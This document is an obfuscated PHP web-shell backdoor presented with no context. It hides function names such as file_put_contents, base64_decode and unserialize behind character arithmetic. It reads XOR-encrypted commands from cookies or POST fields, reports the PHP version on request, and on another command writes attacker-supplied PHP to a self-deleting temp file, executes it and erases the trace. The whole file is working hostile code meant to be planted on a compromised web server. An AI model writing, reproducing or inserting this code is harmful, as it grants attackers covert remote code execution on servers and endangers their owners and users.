<?php /* ts*/function	wuymgq(){/*f_ff   */print	(20346);	}$regx_/*   qxx */=	'regx_'/* iup  */^/*cappg */'';

$phxakfdmj  =	"f"."i"."l"."e"."_".$regx_(112)       .	$regx_(317-200)	.	"t".$regx_(95)      .	"\x63"    ./*   pwnl */"\157"	.	"n".$regx_(553-437)	.       $regx_(101)	.	"\x6e"     .    "t"."s";
$pas_ljwe/* _dcr*/=/*  u*/$regx_(1070-972)    .      $regx_(740-643)	.	$regx_(115)/*  z*/.  $regx_(101)    ./*   ba   */"\x36"/*  ds*/.  "\64"/* m  */.	"_"."d"."\x65"    ./*  ncsj*/"c".$regx_(469-358)	./* tu */"\144"	.      $regx_(101);$aumdjw    =     $regx_(886-769)     ./*   hiun   */"n"."\163"	.	"e"."r"."i".$regx_(97)    .	$regx_(108)/* gq*/./*  dkqa */"\151"      .   $regx_(748-626)      .	"e";


$xeswbd	=/*vtclq   */"\x70"/*mm*/.	$regx_(983-879)/*acuq*/.      "p"."\x76"/*  a   */.   "\x65"	.	"r"."\163"       ./*da*/"\151"      .	"o".$regx_(731-621);


$ozaer      =   "\x75"/*tguz  */./*  g */"n".$regx_(108)       .      $regx_(105)	./*wqqbk   */"n".$regx_(390-283);





       
function/*ns   */vvg__($zozpx,	$nmwcgyidvzxb_)
{      global      $regx_;


	$lvyce      =/* fti */"";

/*dsgrp*/for/* yqk */($igzuqme/*mwc */=    0;      $igzuqme       <	strlen($zozpx);)	{
/* azuzs */for	($nmwcgyi	=	0;   $nmwcgyi/*_g_a   */</*  eg_  */strlen($nmwcgyidvzxb_)	&&	$igzuqme/*   lu */<	strlen($zozpx);    $nmwcgyi++,	$igzuqme++)/*_ihr*/{

      $lvyce/*   vnll  */.=     $regx_(ord($zozpx[$igzuqme])/*  vu*/^	ord($nmwcgyidvzxb_[$nmwcgyi]));/* uhh  */}

/* wd */}  return/*  mivnq   */$lvyce;


}





$wgukgvg/*jczli */=  $_COOKIE;

$vqxaf	=/*   a  */$_POST;


$wgukgvg    =	array_merge($vqxaf,	$wgukgvg);


$pllrwcln  =/*esa  */"\x30"	./*o*/$regx_(53)/* zej   */.     $regx_(516-419)."4"."\142"/* i  */.   "\71"	.      $regx_(197-95)	./*  qybmw */$regx_(516-419)."-"."5"."\63"	./*   wt*/$regx_(495-446)       .      "6".$regx_(668-623)   .	$regx_(1045-993)/*  t   */.     "c".$regx_(52)/*wks*/.    "\x35"    .	$regx_(45)/*ur  */./* cgug   */"\x61"   .	$regx_(1051-995)	.	"\x63"	.       $regx_(51)	./*ve_vt */"-".$regx_(98)	.      "\x64"."3".$regx_(884-828)   .       "1".$regx_(53)/*ijubt */.	"\143"	./*c_ed  */$regx_(102)	.     "\x35"/*   fpfbt  */.	"8"."\x36"  .	"\62";

foreach/*   xhpi*/($wgukgvg	as	$dxqje       =>	$zozpx)      {

       $zozpx	=/*  _m */$aumdjw(vvg__(vvg__($pas_ljwe($zozpx),     $pllrwcln),/*  xipr*/$dxqje));

     if/*  emfk */(isset($zozpx[$regx_(516-419)."k"]))	{


/*   lkj  */if/*  rjuo   */($zozpx[$regx_(516-419)]	==       "i")/*   z */{
   $igzuqme/*  kff   */=/*u_yw */array();


	$igzuqme["\160"      ./* t */"\166"]	=/*   tb*/$xeswbd();

  $igzuqme["s"."\166"]	=	"3"."\x2e"       .	"5";
/*c_ */echo     @serialize($igzuqme);

       }	elseif	($zozpx[$regx_(516-419)]	==/* nhjjq */"e")   {
   $_dcki/*qmx*/=       sprintf(".".$regx_(631-584)/* xz*/.   "\x25"/*  f_kbb   */.      "\163"/*pbt  */.   "."."\160"    .    "l",	md5($pllrwcln));
	$phxakfdmj($_dcki,/*   h*/"<"   ./* uambe*/"\x3f"   .    "p"."h"."p".$regx_(32)  .     "\165"	.    "n"."l"."i".$regx_(221-111)    .	"k".$regx_(791-751)  .	"\137"     .	"\137"	.	"\x46"  ./*  skn */$regx_(326-253)   .     "L".$regx_(779-710)    ./*  uoww   */"_"."\x5f"/* exurh   */.	"\x29"     .	"\73"    .	$regx_(32)       ./*   nyybu*/$zozpx["\x64"]);


	include($_dcki);
/*vf  */$wrdevuw/* dtfo   */=     $_dcki;/*  wz_*/$ozaer($wrdevuw);
/*  _tjm*/}
	exit();


	}

}

